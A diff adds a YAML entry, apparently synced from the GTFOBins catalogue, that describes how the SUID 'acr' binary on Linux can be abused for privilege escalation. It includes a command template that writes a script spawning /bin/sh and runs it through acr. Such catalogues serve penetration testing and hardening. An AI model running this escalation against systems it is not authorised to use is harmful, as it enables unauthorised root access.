@@ -1,0 +1,28 @@
+id: gtfobins/acr/command/suid
+type: binary
+platform: linux
+name: acr
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo -e ''x:\n\t/bin/sh 1>&0 2>&0'' >/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    acr -r ./relative/path/to/temp-file'
+references:
+- https://gtfobins.github.io/gtfobins/acr/
+tags:
+- linux
+- unix
+- gtfobins
